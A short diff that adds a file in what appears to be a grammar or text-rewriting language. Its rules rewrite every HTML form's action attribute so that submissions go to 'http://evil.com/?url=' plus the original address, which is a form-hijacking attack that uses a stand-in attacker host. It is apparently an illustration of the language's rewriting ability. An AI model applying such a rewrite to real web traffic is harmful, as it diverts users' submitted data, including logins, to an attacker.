@@ -1,0 +1,9 @@
+main := /<form/ sp /action=/ orig@url evil sp />/ main
+      | /./ main
+      | ""
+
+url := q? /[^"’ >]/* q?
+q := ~/"|’/
+addq := "\""
+sp := / /*
+evil := addq "http://evil.com/?url=" !orig addq
